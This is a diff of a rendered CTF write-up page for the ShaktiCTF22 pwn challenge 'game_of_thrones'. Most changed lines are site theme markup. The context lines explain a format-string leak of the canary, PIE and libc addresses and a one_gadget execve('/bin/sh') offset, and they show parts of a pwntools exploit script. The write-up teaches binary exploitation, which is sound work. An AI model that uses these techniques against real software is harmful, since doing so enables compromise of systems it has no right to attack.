@@ -9,62 +9,50 @@
         <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF22/pwn/game_of_thrones/writeup/">
         <link rel="shortcut icon" href="../../../../img/favicon.ico">
         <title>game_of_thrones - CTF-Writeups</title>
-        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../../css/bootstrap.min.css" rel="stylesheet">
         <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
         <link href="../../../../css/base.css" rel="stylesheet">
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
-        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-        <!--[if lt IE 9]>
-            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-        <![endif]-->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/darcula.min.css">
 
         <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
-        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script src="../../../../js/bootstrap.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
 
     <body>
-
-        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
             <div class="container">
-
-                <!-- Collapsed navigation -->
-                <div class="navbar-header">
-                    <!-- Expander button -->
-                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
-                        <span class="sr-only">Toggle navigation</span>
-                        <span class="icon-bar"></span>
-                        <span class="icon-bar"></span>
-                        <span class="icon-bar"></span>
-                    </button>
-                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
-                </div>
+                <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
 
                 <!-- Expanded navigation -->
-                <div class="navbar-collapse collapse">
+                <div id="navbar-collapse" class="navbar-collapse collapse">
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
-                            <li >
-                                <a href="../../../../about/">About Us</a>
+                            <li class="navitem">
+                                <a href="../../../../about/" class="nav-link">About Us</a>
                             </li>
-                            <li >
-                                <a href="../../../../shaktictf/">ShaktiCTF</a>
+                            <li class="navitem">
+                                <a href="../../../../shaktictf/" class="nav-link">ShaktiCTF</a>
                             </li>
-                            <li >
-                                <a href="https://team-shakti.github.io/">Website</a>
+                            <li class="navitem">
+                                <a href="https://team-shakti.github.io/" class="nav-link">Website</a>
                             </li>
                         </ul>
 
-                    <ul class="nav navbar-nav navbar-right">
-                        <li>
-                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
                                 <i class="fa fa-search"></i> Search
                             </a>
                         </li>
-                            <li>
-                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/pwn/game_of_thrones/writeup.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                            <li class="nav-item">
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/pwn/game_of_thrones/writeup.md" class="nav-link">Edit on Team-Shakti/CTF-Write-ups
+                                    </a>
                             </li>
                     </ul>
                 </div>
@@ -72,18 +60,53 @@
         </div>
 
         <div class="container">
-                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
-    <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#game_of_thrones">game_of_thrones</a></li>
-            <li><a href="#preliminary-analysis">Preliminary Analysis:</a></li>
-            <li><a href="#understanding-the-challenge">Understanding the challenge</a></li>
-            <li><a href="#exploitation">Exploitation:</a></li>
-        <li class="main "><a href="#infonum_men-shexnum_men">info('num_men: %s'%hex(num_men))</a></li>
-        <li class="main "><a href="#printoff1">print(off1)</a></li>
-        <li class="main "><a href="#printoff2">print(off2)</a></li>
-    </ul>
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#game_of_thrones" class="nav-link">game_of_thrones</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-level="2"><a href="#preliminary-analysis" class="nav-link">Preliminary Analysis:</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#understanding-the-challenge" class="nav-link">Understanding the challenge</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#exploitation" class="nav-link">Exploitation:</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-level="1"><a href="#infonum_men-shexnum_men" class="nav-link">info('num_men: %s'%hex(num_men))</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-level="1"><a href="#printoff1" class="nav-link">print(off1)</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-level="1"><a href="#printoff2" class="nav-link">print(off2)</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
 </div></div>
-                <div class="col-md-9" role="main">
+                    <div class="col-md-9" role="main">
 
 <h1 id="game_of_thrones">game_of_thrones</h1>
 <p>Author: <a href="https://twitter.com/BhaskaraShravya">d1g174l_f0rtr355</a></p>
@@ -97,7 +120,6 @@
     NX:       NX enabled
     PIE:      PIE enabled
 </code></pre>
-
 <p>Since all the basic security checks are enabled, there is little we can do to think about the approach. Hence let's start debugging and analyzing. One may make of the decompilers such as Ghidra/ IDA to decompile the binary as there was no source code given at the time of the CTF. I have used IDA in my decompilation.</p>
 <h2 id="understanding-the-challenge">Understanding the challenge</h2>
 <p>At first glance we find a few functions present in the binary such as <code>use_dragons</code>, <code>kings_landing</code>, and <code>white_walkers</code> that are of interest to us. Let's take a look at each of these functions to understand what is going on.</p>
@@ -112,7 +134,6 @@
   printf(buffer);
   return 3LL;
 </code></pre>
-
 <ul>
 <li>kings_landing: This function presents us with a switch case like scenario, wherein if we choose option <code>1</code>, we simply get a message saying <code>No men left in the army! You cannot kill the knight king.</code> and the <code>men</code> is made 0. However, option <code>2</code>, firstly checks if the <code>dragons</code> count is between 1 and 3, if so it then asks us how many dragons we wish to use. Here we find another similar format_string type bug. This time we can also read in more characters (upto 50). </li>
 </ul>
@@ -153,7 +174,6 @@
     exit_function(0LL);
   }
 </code></pre>
-
 <ul>
 <li>white_walkers: This function checks whether the number of <code>men</code> is equal to <code>30000</code> and number of <code>dragons</code> is equal to 200. If tru, it calls the <code>exit_function</code> with an argument <code>1</code> else the argument is <code>0</code>. </li>
 </ul>
@@ -171,14 +191,12 @@
     return exit_function(0LL);
   }
 </code></pre>
-
 <ul>
 <li>exit_function: This function is pretty simple, if the argument is <code>1</code> it calls <code>exit()</code> else, it simply returns</li>
 </ul>
 <pre><code>  if ( arg )
     exit(1);
 </code></pre>
-
 <h2 id="exploitation">Exploitation:</h2>
 <p>From the above understanding of the program, we can conclude a few things:
 - Since <code>PIE</code> and <code>Canary</code> are enabled, we will have to leak them using the format string bug in <code>use_dragons</code>. Followed by this, we can also get a libc leak in a similar fashion. The format specifier usually used to leakd addresses is <code>%x</code> or <code>%p</code>. I'll be using <code>%p</code> in my exploit.
@@ -189,7 +207,6 @@
 &gt; aaaaaaaaaaaaaaa %p %p %p %p %p %p %p %p %p %p %p
 aaaaaaaaaaaaaaa 0xa (nil) (nil) 0x31 0x7fffffff 0x55adae26d96c 0x55adae26d928 0x7fe6934688a0 0x132310b9f 0x6161616161616161 0x2061616161616161
 </code></pre>
-
 <p>Since our input string <code>aaaaaaaaaaaaaaa</code> is found at offset <code>10</code> with <code>0xa</code> beign leaked at offset <code>1</code>, we can say that everything we write onto the stack will get stored from offset <code>10</code>. Thus while overwriting, we may just keep in mind the required offset by looking into GDB and if there is any buffer needed to just align the addresses to 8 bytes.</p>
 <p>Also looking at the registers when the exit() function is finally called, I used the following libc offset for execve call:</p>
 <pre><code>0xe6c81 execve(&quot;/bin/sh&quot;, r15, rdx)
@@ -201,7 +218,6 @@ constraints:
 
 ## Exploit:
 </code></pre>
-
 <p>def use_dragons(data):
     p.sendlineafter('Your choice: ', '1')
     p.sendlineafter('Say something in Valyrian: ', data)
@@ -262,6 +278,7 @@ pay3 += p64(num_dragons)</p>
 <p>white_walkers('\n3')</p>
 <p>p.interactive()
 ```</p></div>
+            </div>
         </div>
 
         <footer class="col-md-12">
@@ -271,41 +288,38 @@ pay3 += p64(num_dragons)</p>
         </footer>
         <script>
             var base_url = "../../../..",
-                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
         </script>
         <script src="../../../../js/base.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
         <script src="../../../../search/main.js" defer></script>
 
-        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
-    <div class="modal-dialog">
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
         <div class="modal-content">
             <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                 <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
-                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
             </div>
             <div class="modal-body">
-                <p>
-                    From here you can search these documents. Enter
-                    your search terms below.
-                </p>
-                <form role="form">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
                     <div class="form-group">
-                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                     </div>
                 </form>
-                <div id="mkdocs-search-results"></div>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
             </div>
             <div class="modal-footer">
             </div>
         </div>
     </div>
-</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
     <div class="modal-dialog">
         <div class="modal-content">
             <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                 <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
-                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
             </div>
             <div class="modal-body">
               <table class="table">
